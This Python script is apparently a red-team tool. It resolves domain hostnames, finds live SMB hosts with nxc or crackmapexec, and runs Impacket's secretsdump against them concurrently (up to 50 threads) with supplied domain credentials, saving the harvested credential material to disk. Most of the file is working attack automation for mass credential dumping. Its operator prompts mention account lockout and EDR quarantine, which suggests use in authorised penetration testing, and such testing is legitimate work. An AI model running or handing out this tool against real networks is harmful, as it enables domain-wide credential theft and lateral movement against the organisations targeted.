import argparse
import os
import subprocess
import sys
import logging
import re
from tqdm import tqdm
import dns.resolver
import concurrent.futures
import shutil

# Setup logging to file, ensuring it appends each time the tool runs
logging.basicConfig(filename='dumper.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', filemode='a')

def is_valid_hostname(hostname):
    return re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.-]{1,253}[a-zA-Z0-9]$', hostname) is not None

def resolve_hostnames(hosts, name_server):
    resolved_hosts = {}
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [name_server]
    
    for host in hosts:
        try:
            answers = resolver.resolve(host, 'A')
            for rdata in answers:
                resolved_hosts[host] = rdata.address
                logging.debug(f"Resolved hostname: {host} -> {rdata.address}")
                break
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
            logging.error(f"Failed to resolve hostname: {host} - {e}")
    
    return resolved_hosts

def check_live_hosts(target_file):
    from shutil import which
    import re
    import subprocess

    def is_tool_installed(tool_name):
        return which(tool_name) is not None

    def run_netexec(target_file):
        try:
            result = subprocess.run(['nxc', 'smb', target_file], capture_output=True, text=True)
            logging.info(f"Netexec output: {result.stdout}")
            return result.stdout
        except Exception as e:
            logging.error(f"Netexec failed: {e}")
            return None

    def run_crackmapexec(target_file):
        try:
            result = subprocess.run(['crackmapexec', 'smb', target_file], capture_output=True, text=True)
            logging.info(f"Crackmapexec output: {result.stdout}")
            return result.stdout
        except Exception as e:
            logging.error(f"Crackmapexec failed: {e}")
            return None

    if is_tool_installed('nxc'):
        logging.info("Using Netexec for SMB check")
        output = run_netexec(target_file)
        if output is None:
            logging.error("Netexec failed")
            return []
    elif is_tool_installed('crackmapexec'):
        logging.info("Netexec not found, falling back to Crackmapexec")
        output = run_crackmapexec(target_file)
        if output is None:
            logging.error("Crackmapexec failed")
            return []
    else:
        logging.error("Neither Netexec nor Crackmapexec is installed. Please install one of these tools.")
        print("[!] Error: Neither Netexec nor Crackmapexec is installed. Please install one of these tools.")
        return []

    live_hosts = []
    fqdn_map = {}
    with open(target_file, 'r') as f:
        for line in f:
            fqdn = line.strip()
            fqdn_map[fqdn.split('.')[0].upper()] = fqdn

    for line in output.splitlines():
        if '445' in line and 'SMB' in line:
            parts = re.split(r'\s+', line)
            hostname = parts[3] if parts[3] != '445' else None
            if hostname and hostname.upper() in fqdn_map:
                live_hosts.append(fqdn_map[hostname.upper()])

    return live_hosts

def run_secretsdump(host, domain, username, password, output_dir):
    output_file = os.path.join(output_dir, f"{host}.secretsdump")
    secretsdump_cmd = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not secretsdump_cmd:
        logging.error("[!] Neither secretsdump.py nor impacket-secretsdump is available in PATH.")
        return f"[!] Neither secretsdump.py nor impacket-secretsdump is available in PATH."
    
    cmd = [
        secretsdump_cmd,
        f"{domain}/{username}:{password}@{host}",
        "-outputfile", output_file
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    logging.debug(f"Command executed: {' '.join(cmd)}")
    logging.debug(f"Command output: {result.stdout}")
    logging.debug(f"Command error: {result.stderr}")
    
    # Filter out the "Cleaning up..." message
    filtered_stdout = "\n".join([line for line in result.stdout.splitlines() if "Cleaning up..." not in line])
    filtered_stderr = "\n".join([line for line in result.stderr.splitlines() if "Cleaning up..." not in line])
    
    error_message = None
    if "[-] RemoteOperations failed:" in filtered_stdout or "[-] RemoteOperations failed:" in filtered_stderr:
        error_output = filtered_stderr if "[-] RemoteOperations failed:" in filtered_stderr else filtered_stdout
        error_message = error_output.split("[-] RemoteOperations failed:")[1].strip()
    
    if error_message:
        logging.error(f"[!] Secretsdump against {host} failed: {error_message}")
        return f"[!] Secretsdump against {host} failed: {error_message}"
    elif result.returncode == 0:
        logging.info(f"[+] Secretsdump against {host} complete -> See output directory for results.")
        return f"[+] Secretsdump against {host} complete -> See output directory for results."
    else:
        logging.error(f"[!] Secretsdump against {host} failed: {filtered_stderr.strip()}")
        return f"[!] Secretsdump against {host} failed: {filtered_stderr.strip()}"

def main():
    parser = argparse.ArgumentParser(description="Perform multithreaded Secretsdump against live hosts")
    parser.add_argument("-tf", "--target-file", required=True, help="File containing list of hostnames")
    parser.add_argument("-d", "--domain", required=True, help="Domain")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-o", "--output", help="Output directory for secretsdump results [Default: <current-directory>/Secretsdump_Output]")
    parser.add_argument("-ns", "--nameserver", required=True, help="Specify a name server for DNS resolution")
    args = parser.parse_args()

    confirmation = input(f"[*] User, you are about to perform large amounts of authentication attempts with the user \"{args.username}\". Are you cool with the potential of locking out this account? (Y/N): ").strip().lower()
    if confirmation != 'y':
        print("[!] Operation aborted by the user.")
        sys.exit(0)

    confirmation = input(f"[*] ...more importantly --> have you tested Secretsdump against single hosts to make sure you're not about to spark up a mass quarantine of all domain hosts? (Y/N): ").strip().lower()
    if confirmation != 'y':
        print("[!] Better to double check just to make sure you don't make a boo-boo.")
        sys.exit(0)
        
    output_dir = args.output if args.output else os.path.join(os.getcwd(), "Secretsdump_Output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    if not os.access(output_dir, os.W_OK):
        print(f"[!] Error: The output directory {output_dir} is not writable.", file=sys.stderr)
        logging.error(f"[!] The output directory {output_dir} is not writable.")
        sys.exit(1)

    with open(args.target_file, 'r') as f:
        hosts = [line.strip() for line in f if line.strip()]

    if any('/' in host for host in hosts) or any(host.replace('.', '').isdigit() for host in hosts):
        print("[!] Error: Please provide a list of domain computers extracted from LDAP instead of IP addresses or CIDR ranges.", file=sys.stderr)
        logging.error("[!] Provided hosts file contains IP addresses or CIDR ranges. Please provide a list of domain computers extracted from LDAP.")
        sys.exit(1)

    invalid_hosts = [host for host in hosts if not is_valid_hostname(host)]
    if invalid_hosts:
        print(f"[!] Error: The following entries are not valid hostnames: {', '.join(invalid_hosts)}", file=sys.stderr)
        logging.error(f"[!] Invalid hostnames detected: {', '.join(invalid_hosts)}")
        sys.exit(1)

    print("[+] Resolving hostnames...")
    resolved_hosts = resolve_hostnames(hosts, args.nameserver)
    if not resolved_hosts:
        print("[!] Error: Hostname resolution failed!")
        logging.error("[!] Hostname resolution failed!")
        sys.exit(1)
    
    print("[+] Checking for live SMB hosts...")
    live_hosts = check_live_hosts(args.target_file)
    if not live_hosts:
        print("[!] Error: No live hosts detected!")
        logging.error("[!] No live hosts detected!")
        sys.exit(1)
    else:
        print(f"Successfully found {len(live_hosts)} live SMB hosts...")
    logging.info(f"[+] Live SMB hosts detected: {', '.join(live_hosts)}")

    if live_hosts:
        with tqdm(total=len(live_hosts), desc="Performing secretsdump", unit="host") as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                future_to_host = {executor.submit(run_secretsdump, host, args.domain, args.username, args.password, output_dir): host for host in live_hosts}
                for future in concurrent.futures.as_completed(future_to_host):
                    host = future_to_host[future]
                    try:
                        result = future.result()
                        if "failed" in result:
                            print(f"[!] Secretsdump against {host} failed: {result}", file=sys.stderr)
                            logging.info(result)
                        else:
                            print(result)
                            logging.info(result)
                    except Exception as exc:
                        error_msg = f"[!] Error dumping secrets for host {host}: {exc}"
                        print(error_msg, file=sys.stderr)
                        logging.error(error_msg)
                    pbar.update(1)
            executor.shutdown(wait=False)

if __name__ == "__main__":
    main()
